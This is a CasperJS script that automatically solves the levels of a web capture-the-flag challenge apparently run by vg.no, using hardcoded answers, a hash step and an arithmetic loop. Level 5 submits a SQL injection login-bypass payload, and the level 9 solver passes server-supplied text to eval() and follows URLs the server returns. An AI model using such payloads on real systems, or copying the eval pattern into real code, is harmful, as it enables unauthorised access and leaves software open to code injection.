#!/usr/bin/env casperjs

/**
   
   Call this script like so:
   ./vg_ctf.js <nick>

   You will win the internet!

**/

var casper=require('casper').create({
    verbose: true,
    logLevel: "debug"
});
casper.userAgent('Sex Robot http://www.youtube.com/watch?v=HGSVYgcy24Q');
casper.on('remote.alert', myAlert);
function myAlert(msg) {
    casper.echo('ALERT: '+msg);
}

var baseUrl = 'http://www.vg.no/ctf/';
casper.start(baseUrl);
casper.then(function() {
    this.click('a.btn');
});
// Level 1
casper.thenEvaluate(function() {
    $('[name=username]').val('secure');
    $('[name=password]').val('enough');
    $(':submit').click();
});
// Level 2
casper.thenEvaluate(function() {
    $('[name=secret]').val('youcanhazaccezz');
    $(':submit').click();
});
// Level 3

casper.thenEvaluate(function() {
    $.ajax('level4.php', {
        success: function(d, s, j) {
            location.href = j.getResponseHeader('Location');
        },
        error: function() {
            alert('Unable to get the URL for level 4.');
        },
        type: 'DELETE',
        async: false
    });
});

casper.then(function() {
    // do nothing
});

// level 4

casper.thenEvaluate(function() {
    $('#matcher_input').val('/([0-9]{1,2}-[0-9]{1,2}-[0-9]{4})/');
    $(':submit').click();
});

// level 5
casper.thenEvaluate(function() {
    $('[name=username]').val("\" or '1'='1' -- \"");
    $(':submit').click();
});

// level 6
casper.thenEvaluate(function() {
    var context = window.VG.canvasContext;

    var imgData = context.getImageData(0, 0, 185, 43);
    var total = 0;
    for (i=0; i<imgData.data.length; i+=4) {
        total+=imgData.data[i];
        total+=imgData.data[i+1];
        total+=imgData.data[i+2];
    }
    $('[name=sum]').val(total);
    $(':submit').click();
});

// level 7
casper.thenEvaluate(function() {
    $('#query').val('select count(*) as count, avg(age) as averageAge, sum(numPosts) as totalPosts from users;');
    $(':submit').click();
});

// level 8
casper.then(function() {
    casper.page.injectJs('js/includes/jshash-2.2/md5.js');
});
casper.thenEvaluate(function() {
    var key=$('[name=key]').val();
    var hash = hex_md5(key);
    $('[name=md5]').val(hash);
    console.log('hash: '+hash);
    $(':button').click();
});

// level 9
// maths!

casper.thenEvaluate(function() {
    var taskId = Math.floor(Math.random() * 10000), taskNum = 0;
    function solveTask(equation, status, xhr) {
        var realequation = '';
        var strings = equation.split(';');
        for(var i=0; i < strings.length; ++i) {
            if (strings[i].match(/^[0-9\/\*\+\-\s]+$/)) {
                realequation = strings[i];
                break;
            }
            else if (strings[i].match(/^Nope/)) {
                console.log('error! ' + equation);
                return;
            }
            else if (strings[i].match(/^http:\/\//)) {
                window.location = strings[i];
            }
        }
        console.log('equation: '+equation + ' realequation: ' + realequation);
        eval('var result = '+realequation + ';');
        console.log('  result: '+result+' status: '+status+' taskNum '+taskNum +"\n");
        var getstring = '?taskId='+taskId+'&result='+result+'&taskNum='+taskNum;
        ++taskNum;
        $.ajax( {
            url: 'task.php'+getstring,
            success: solveTask,
            type: 'POST',
            async: false
        });
    }
    $.ajax( {
        url: 'task.php?taskId=' + taskId,
        success: solveTask,
        type: 'POST',
        async: false
    });
    
});

// level 10
casper.then(function() {
    var nick=this.cli.args[0];
    this.setFilter("page.prompt", function(msg, value) {
        return nick;
    });
});
casper.thenEvaluate(function() {
    $('#a').submit();
});

casper.run();
